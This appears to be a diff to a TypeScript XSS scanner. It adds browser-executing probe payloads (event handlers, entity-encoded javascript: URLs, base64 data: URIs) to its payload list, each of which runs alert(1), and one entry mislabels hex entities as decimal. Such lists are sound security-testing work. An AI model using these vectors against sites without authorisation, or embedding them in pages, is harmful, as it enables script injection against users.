@@ -31,6 +31,11 @@ const XSS_PAYLOADS = [
   { payload: '";alert(1);//', type: 'JS Context Break (DOM)', severity: 'critical' as const, confidence: 0.95 },
   { payload: "';alert(1);//", type: 'JS Context Break (DOM)', severity: 'critical' as const, confidence: 0.95 },
   { payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>', type: 'Iframe srcdoc', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '<details open ontoggle=alert(1)>', type: 'Details Tag Event', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '<a onmouseover=alert(1)>', type: 'Onmouseover Event', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '<isindex action=javascript:alert(1) type=image>', type: 'Isindex Tag', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '<marquee onstart=alert(1)>', type: 'Marquee Tag Event', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', type: 'Object Data URI', severity: 'critical' as const, confidence: 0.95 },
 
   // --- High Evasion/Protocol Payloads ---
   { payload: 'javascript:alert(1)', type: 'JavaScript Protocol', severity: 'high' as const, confidence: 0.9 },
@@ -39,6 +44,11 @@ const XSS_PAYLOADS = [
   { payload: '<video onerror=alert(1)><source src=1></video>', type: 'Media Onerror', severity: 'high' as const, confidence: 0.85 },
   { payload: '%3Cscript%3Ealert(1)%3C%2Fscript%3E', type: 'URL-encoded Script', severity: 'medium' as const, confidence: 0.75 },
   { payload: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', type: 'HTML Entity Encoded', severity: 'medium' as const, confidence: 0.75 },
+  { payload: '&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;', type: 'Decimal Entity Encoded', severity: 'medium' as const, confidence: 0.75 },
+  { payload: '<img src=x onauxclick=alert(1)>', type: 'Event Handler (Auxclick)', severity: 'high' as const, confidence: 0.9 },
+  { payload: '<body onpageshow=alert(1)>', type: 'Body Onpageshow', severity: 'high' as const, confidence: 0.9 },
+  { payload: '<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">', type: 'CSS Animation', severity: 'high' as const, confidence: 0.9 },
+  { payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>', type: 'Data URI Link', severity: 'high' as const, confidence: 0.9 },
 ];
 
 const XSS_DANGEROUS_CONTEXTS = [
@@ -71,7 +81,7 @@ const checkReflection = (response: string, payload: string): {
     const index = lowerResponse.indexOf(lowerPayload);
     const contextSnippet = response.substring(Math.max(0, index - 150), Math.min(response.length, index + payload.length + 150));
     
-    let confidence = 0.7; // Default confidence for direct reflection (Raised from 0.5 to 0.7 for better detection)
+    let confidence = 0.7; // Default confidence for direct reflection
     let contextType = 'Direct reflection in HTML (potential XSS)';
     
     // Check if in dangerous context
